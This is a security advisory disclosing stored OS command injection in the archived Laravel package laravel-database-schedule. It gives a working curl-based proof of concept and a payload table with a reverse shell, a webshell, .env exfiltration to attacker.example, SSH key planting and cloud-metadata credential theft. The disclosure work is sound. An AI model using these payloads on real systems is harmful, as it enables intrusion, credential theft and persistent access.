---
title: "Security Advisory LDBS-2026-001-B: Stored OS Command Injection via command_custom in laravel-database-schedule"
date: 2026-08-03 13:00:00 +0300
categories: [Security Advisories, Laravel]
tags: [laravel, rce, command-injection, disclosure]
description: "Coordinated disclosure (LDBS-2026-001-B): the command_custom field passes an unvalidated shell string straight to /bin/sh -c in robersonfaria/laravel-database-schedule. Any user with scheduler form access gets OS command execution — and it exits DONE, leaving no log anomaly. Critical — CVSS 9.9, CWE-78. No patch; repository archived."
---

| Field               | Value                                                                                          |
|---------------------|-----------------------------------------------------------------------------------------------|
| **Advisory ID**     | LDBS-2026-001-B                                                                                |
| **Package**         | `robersonfaria/laravel-database-schedule`                                                      |
| **Packagist**       | https://packagist.org/packages/robersonfaria/laravel-database-schedule                         |
| **Repository**      | https://github.com/robersonfaria/laravel-database-schedule                                     |
| **Affected**        | All versions ≤ 1.4.0 — **no patch will be issued (repository archived)**                      |
| **Discovered**      | 2026-05-08                                                                                     |
| **Reported**        | 2026-05-11                                                                                     |
| **Maintainer reply**| 2026-05-11 — repository archived; public advisory submission approved                         |
| **CVE ID**          | Requested from MITRE 2026-05-12 — assignment pending as of publication                        |
| **Published**       | 2026-08-03 (public advisory)                                                                   |
| **Severity**        | Critical                                                                                       |
| **CVSS 3.1 Score**  | 9.9 — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`                                                 |
| **CWE**             | CWE-78 (Improper Neutralization of Special Elements used in an OS Command)                    |
| **Reporter**        | Tunahan Burak Dirlik (independent security researcher)                                                   |

> **Related advisory:**
> - LDBS-2026-001-A — Stored PHP Code Injection via `eval()` (CWE-94)

---

## Disclosure Timeline

| Date | Event |
|------------|-------|
| 2026-05-08 | Both vulnerabilities discovered during a security audit of `master` HEAD. |
| 2026-05-11 | Reported privately to the package maintainer; proof-of-concept executed the same day. |
| 2026-05-11 | Maintainer acknowledged and confirmed both findings, archived the repository, added a deprecation notice marking the package as vulnerable and unmaintained, stated that no patch would be released, and approved submission of a public advisory. |
| 2026-05-12 | CVE ID requested from MITRE for both findings (LDBS-2026-001-A and LDBS-2026-001-B). |
| 2026-08-03 | Public advisory published. No CVE ID had been assigned by MITRE at the time of publication; the request remains pending. |

> This advisory is published with the maintainer's explicit approval, following coordinated disclosure. The affected package is archived and will not receive a patch — publication serves to inform downstream users who may still be running it. See **Remediation** for migration guidance.

---

## Executive Summary

`robersonfaria/laravel-database-schedule` supports a "custom" command mode in which the user supplies an arbitrary shell command string via the `command_custom` form field. The dispatch logic passes this value verbatim to `Illuminate\Console\Scheduling\Schedule::exec()`, which Laravel implements by passing the string to `/bin/sh -c` via Symfony's `Process::fromShellCommandline()`. All shell metacharacters (`;`, `|`, `&`, `>`, `$()`, backticks) are honoured.

Validation on `command_custom` is limited to `nullable|string|required_if:command,custom` — no character restriction, no metacharacter denylist, no command allowlist.

This is a documented feature of the package: the create/edit form presents a `Custom Command` text input that becomes active when the command-type dropdown is set to `custom`. Any user who can reach the form can execute arbitrary OS commands.

Compared to LDBS-2026-001-A, this vector is simpler to exploit (no PHP knowledge required), accepts raw shell syntax natively, and — critically — exits with status `DONE` rather than `FAIL`, leaving no anomaly signal in scheduler logs.

The intended deployment of this package requires operators to define a `viewDatabaseSchedule` gate that authorizes users to reach the scheduler UI; the threat model therefore assumes a low-privileged authenticated user with form access (CVSS `PR:L`). See *Operator Configuration Amplifier* below for the impact of a documented but insecure configuration choice.

The package maintainer has confirmed the package is unmaintained, archived the repository, and added a deprecation notice. No patch will be released. Users running this package in production should be aware of this status when planning their upgrade or migration path.

---

## Test Environment

| Component        | Detail                                                        |
|------------------|---------------------------------------------------------------|
| **Device**       | Apple MacBook (Apple Silicon)                                 |
| **OS**           | macOS (darwin, arm64)                                         |
| **Shell**        | zsh                                                           |
| **PHP**          | 8.5.6 (Homebrew) — `brew install php`                         |
| **Composer**     | 2.9.7 — `brew install composer`                               |
| **grep**         | GNU grep 3.12 (Homebrew) — `brew install grep` (`ggrep`)      |
| **Laravel**      | 10.50.2 (`laravel/laravel:^10`, installed as `v10.3.3`)       |
| **Package**      | `robersonfaria/laravel-database-schedule` 1.4.0               |
| **Database**     | SQLite via `pdo_sqlite` (built into PHP, no server required)  |
| **Web server**   | `php artisan serve` — `http://127.0.0.1:8000`                 |

### Reproduction Setup

```bash
# 1. Install prerequisites
brew install php composer grep

# 2. Create a fresh Laravel 10 project
composer create-project laravel/laravel:^10 ldbs-test
cd ldbs-test
touch database/database.sqlite

# 3. Configure .env — set DB_CONNECTION=sqlite, comment out DB_HOST/DB_DATABASE.
#
#    For PoC reproducibility, set SCHEDULE_RESTRICTED_ACCESS=false. This disables
#    the package's authentication middleware so the curl-based PoC below can run
#    without setting up a Laravel auth provider and `viewDatabaseSchedule` gate.
#    The README explicitly warns that this configuration exposes /schedule publicly;
#    it is used here only to keep the reproduction self-contained. The vulnerability
#    itself is independent of this setting — it triggers for any user who can reach
#    the form, including legitimate authenticated users in a properly configured
#    deployment.

# 4. Install the vulnerable package
composer require robersonfaria/laravel-database-schedule
# Locked: robersonfaria/laravel-database-schedule (1.4.0)

# 5. Publish config and run migrations
php artisan vendor:publish \
  --provider="RobersonFaria\DatabaseSchedule\DatabaseSchedulingServiceProvider" \
  --tag=config
php artisan migrate

# 6. Start the development server
php artisan serve
# INFO  Server running on [http://127.0.0.1:8000].
```

### CSRF Token Helper

All POST endpoints require a CSRF token:

```bash
get_token() {
  curl -c cookies.txt -b cookies.txt -s 'http://127.0.0.1:8000/schedule/create' \
    | ggrep -oP 'name="_token"[^>]*value="\K[^"]+' | head -1
}
TOKEN=$(get_token)
echo $TOKEN
# CKAWIT288IFQAe97SEW9lZ70RoUA23JfwI2NRgeh
```

---

## Vulnerability Detail

### Vulnerable Code

**`src/Console/Scheduling/Schedule.php` — `dispatch()`:**

```php
private function dispatch($task)
{
    if ($task->command === 'custom') {
        $command = $task->command_custom;         // ← user-supplied, unvalidated
        $event = $this->schedule->exec($command); // ← passed directly to /bin/sh -c
    } else {
        $command = $task->command;
        $event = $this->schedule->command(
            $command,
            array_values($task->getArguments()) + $task->getOptions()
        );
    }
    // ...
}
```

**`src/Http/Requests/ScheduleRequest.php`:**

```php
return [
    // ...
    'command_custom' => 'nullable|string|required_if:command,custom', // ← string only, no sanitization
    // ...
];
```

### Why `exec()` Allows Shell Injection

`Illuminate\Console\Scheduling\Schedule::exec()` is a thin wrapper around Symfony's `Process::fromShellCommandline()`, which constructs:

```
/bin/sh -c "<user-supplied string>"
```

Because the string is passed directly to a shell interpreter, all shell metacharacters are interpreted as-is. There is no escaping, quoting, or allowlist applied at any layer between the HTTP request and the shell.

### Data Flow

```
HTTP POST /schedule
  └─ ScheduleController::store()
       └─ $schedule->create([
              'command'        => 'custom',
              'command_custom' => 'id > /tmp/.pwn2 && whoami >> /tmp/.pwn2',
              ...
          ])
            └─ schedules.command_custom = "id > /tmp/.pwn2 && whoami >> /tmp/.pwn2"
                 ↓ (next scheduler tick)
            Schedule::dispatch($task)
               └─ $this->schedule->exec("id > /tmp/.pwn2 && whoami >> /tmp/.pwn2")
                    └─ /bin/sh -c "id > /tmp/.pwn2 && whoami >> /tmp/.pwn2"  ← RCE
```

---

## Proof of Concept

### Step 1 — Reset State and Refresh the CSRF Token

```bash
php artisan migrate:fresh

get_token() {
  curl -c cookies.txt -b cookies.txt -s 'http://127.0.0.1:8000/schedule/create' \
    | ggrep -oP 'name="_token"[^>]*value="\K[^"]+' | head -1
}
TOKEN=$(get_token)
echo "TOKEN: $TOKEN"
# TOKEN: CKAWIT288IFQAe97SEW9lZ70RoUA23JfwI2NRgeh
```

### Step 2 — Create a Custom-Command Schedule

```bash
curl -b cookies.txt -X POST 'http://127.0.0.1:8000/schedule' \
  --data-urlencode "_token=${TOKEN}" \
  --data-urlencode "command=custom" \
  --data-urlencode "command_custom=id > /tmp/.pwn2 && whoami >> /tmp/.pwn2" \
  --data-urlencode "expression=* * * * *"
```

Server responds with a `302` redirect to `/schedule/index` — the row was accepted and persisted.

### Step 3 — Trigger the Scheduler

```bash
php artisan schedule:run
```

```
2026-05-11 22:55:52 Running [id > /tmp/.pwn2 && whoami >> /tmp/.pwn2] .....  14ms DONE
  ⇂ id > /tmp/.pwn2 && whoami >> /tmp/.pwn2
    > 'storage/logs/schedule-5a38bbabaab4a8d83d2b1e40ef9447768afd6292.log' 2>&1
```

The task exits `DONE` (exit code 0). Unlike LDBS-2026-001-A, this vector produces **no anomaly in scheduler logs** — the `DONE` status is indistinguishable from a legitimate task completing successfully.

### Step 4 — Verify Code Execution

```bash
cat /tmp/.pwn2
```

```
uid=501(tburakdirlik) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),
79(_appserverusr),80(admin),81(_appserveradm),701(com.apple.sharepoint.group.1),
702(com.apple.sharepoint.group.2),33(_appstore),98(_lpadmin),100(_lpoperator),
204(_developer),250(_analyticsusers),395(com.apple.access_ftp),
398(com.apple.access_screensharing),399(com.apple.access_ssh),
400(com.apple.access_remote_ae)
tburakdirlik
```

Both `id` and `whoami` executed as the PHP process owner. Shell metacharacter `&&` chained the two commands without any restriction.

---

## Comparison with LDBS-2026-001-A

| Dimension | LDBS-2026-001-A (`eval`) | LDBS-2026-001-B (`command_custom`) |
|-----------|--------------------------|-------------------------------------|
| PHP parsing required | Yes — payload must be valid PHP | No — raw shell string |
| Artisan command required | Yes — must select a valid command name | No — `command=custom` is standalone |
| Shell metacharacters | Via `system()` / `passthru()` calls | Natively available |
| Scheduler exit status | `FAIL` — visible anomaly in logs | `DONE` — no anomaly signal |
| Payload complexity | Moderate | Minimal |
| Detection difficulty | Lower | **Higher** |

---

## Impact

- Full OS command execution as the PHP-FPM / web server user.
- Read/write access to the entire application directory including `.env`, source code, and `storage/`.
- Disclosure of `APP_KEY` enables forging signed cookies and decrypting encrypted session values.
- Disclosure of `DB_*` credentials enables full database access.
- The payload row in `schedules` re-executes on every cron tick — persistent execution without additional file writes.
- Scheduler logs show `DONE`, making this vector significantly harder to detect than LDBS-2026-001-A.

### Operator Configuration Amplifier

The package ships with a `SCHEDULE_RESTRICTED_ACCESS` configuration key (default `true`) that gates the schedule UI behind a `viewDatabaseSchedule` Laravel gate the operator is expected to define. The README documents both the setting and the gate.

When operators set `SCHEDULE_RESTRICTED_ACCESS=false` — a configuration the README explicitly warns against (*"if restricted_access is set to false, access to the /schedule route will be public"*) — the chain documented above becomes reachable by any unauthenticated network client. This is not a separate vulnerability in the package, but is a documented operator choice that significantly amplifies the impact of this finding in deployments where it is set.

Operators running this package with `SCHEDULE_RESTRICTED_ACCESS=false` should be aware that, in the absence of a patch, this configuration is equivalent to publicly exposing a remote-code-execution endpoint, and may wish to factor this into their deployment and migration decisions.

---

## Payload Variants

| Goal | `command_custom` value |
|------|------------------------|
| Reverse shell | `bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'` |
| Persistent webshell | `echo '<?php system($_GET[c]);' > /var/www/html/public/.cache.php` |
| Exfiltrate `.env` | `curl --data @/var/www/html/.env https://attacker.example/` |
| Add SSH key | `echo 'ssh-rsa AAAA... attacker' >> ~/.ssh/authorized_keys` |
| Cloud metadata | `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` |

---

## Remediation

No patch will be released; the repository has been archived and the maintainer has added a deprecation notice to the repository documenting the vulnerable status. The following technical fixes would address this finding if a future maintainer or fork were to patch it:

1. Remove the `custom` command type entirely. There is no safe way to accept user-controlled shell strings.
2. If the feature must be retained, restrict `command_custom` to an explicit allowlist of permitted commands rather than a free-text field.
3. At minimum, add strict validation in `ScheduleRequest::rules()`:

```php
'command_custom' => 'nullable|string|required_if:command,custom|in:allowed-cmd-1,allowed-cmd-2',
```

---

## References

- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- OWASP OS Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- Laravel Scheduler: https://laravel.com/docs/scheduling
- Package repository: https://github.com/robersonfaria/laravel-database-schedule
- Packagist: https://packagist.org/packages/robersonfaria/laravel-database-schedule
- Related advisory LDBS-2026-001-A: `<INSERT PUBLISHED URL>`

---

## Credit

**Tunahan Burak Dirlik** — independent security researcher.
Audit performed against `master` HEAD of `robersonfaria/laravel-database-schedule` on 2026-05-08.
